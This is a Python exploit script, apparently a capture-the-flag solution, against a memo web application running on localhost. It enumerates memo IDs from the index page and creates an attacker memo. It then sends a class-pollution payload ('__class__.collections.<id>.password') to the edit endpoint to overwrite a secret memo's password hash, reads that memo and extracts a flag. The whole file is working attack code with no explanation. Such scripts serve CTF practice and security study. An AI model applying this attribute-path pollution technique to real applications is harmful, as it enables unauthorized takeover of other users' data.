import requests, re
import hashlib, uuid, time

class Exploit:
    def __init__(self, baseURL, secret_id, attacker_password="foo", secret_newpass="bar"):
        self.baseURL = baseURL.rstrip("/")
        self.secret_id = secret_id
        self.attacker_password = attacker_password
        self.secret_newpass = secret_newpass
        self.session = requests.Session()
        self.our_id = None
    
    @staticmethod
    def sha256_hex(sv: str) -> str:
        return hashlib.sha256(sv.encode()).hexdigest()
    
    def get_all_id(self):
        print("[+] Get All Id From Memo")
        response = self.session.get(f"{self.baseURL}/")
        response.raise_for_status()
        return set(re.findall(
            r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
            response.text, re.I
        ))
    
    def create_attacker_memo(self):
        print("[+] Create Attacker Memo")
        title = f"bl4ck0ut-{uuid.uuid4().hex[:8]}"
        data = {"title": title, "content": "bl4ck0ut123", "password": self.attacker_password}
        response = self.session.post(f"{self.baseURL}/new", data=data, allow_redirects=False)
        if response.status_code not in (200, 302):
            print("[-] Create Attacker Memo Failed. Try Again")
            response.raise_for_status()
        return title
    
    def find_attacker_id(self, before_id):
        after = self.get_all_id()
        new_id = list(after - before_id)
        if not new_id:
            raise RuntimeError("[-] Not Found New Memo_Id")
        self.our_id = new_id[-1]
        return self.our_id
    
    def view_memo(self, mid: str, pwd: str, note=""):
        response = self.session.post(f"{self.baseURL}/view/{mid}", data={"password": pwd}, allow_redirects=False)
        print(f"[+] /view/{mid} ({note}) status:", response.status_code)
        txt = response.text

        flag_here = re.search(r"(DH\{.*?\})", txt, re.I | re.S)
        if flag_here:
            print("[***] DONE FLAG FOUND:\n", flag_here.group(1))
        else:
            print("[-] Failed Extract Flag")
            with open("debug_response.html", "w", encoding="utf-8") as f:
                f.write(txt)
                print("[*] Response saved to debug_response.html for manual check.")
        return txt
    
    def overwrite_prototype(self):
        print("[+] Exploit Prototype Pollution: Overwrite Password Of Secret")
        if not self.our_id:
            raise RuntimeError("[-] No our_id to exploit")
        payload = {
            "selected_option": f"__class__.collections.{self.secret_id}.password",
            "edit_data": self.sha256_hex(self.secret_newpass),
            "password": self.attacker_password
        }
        response = self.session.post(f"{self.baseURL}/edit/{self.our_id}", data=payload, allow_redirects=False)
        print(f"[+] /edit exploit status: {response.status_code}")
        if response.status_code not in (200, 302):
            raise RuntimeError("[-] Exploit Failed. Try Again")

    def run_program(self):
        print("[+] Get Id Before Create Memo Attacker")
        before = self.get_all_id()

        print("[+] Create Attacker Memo")
        self.create_attacker_memo()
        time.sleep(0.3)

        print("[+] Get Attacker_Id New")
        self.find_attacker_id(before)
        print("[+] our_id =", self.our_id)

        print("[*] Try reading our memo with the attacker password...")
        self.view_memo(self.our_id, self.attacker_password, "our_memo")

        print("[*] Proceeding to overwrite SECRET password...")
        self.overwrite_prototype()

        print("[*] Read SECRET with new password...")
        self.view_memo(self.secret_id, self.secret_newpass, "Secret After Overwrite")


if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:1112"
    SECRET_ID = "f1400cdf-0a37-4d77-9aca-09c533b66853"
    exploit = Exploit(BASE_URL, SECRET_ID)
    exploit.run_program()
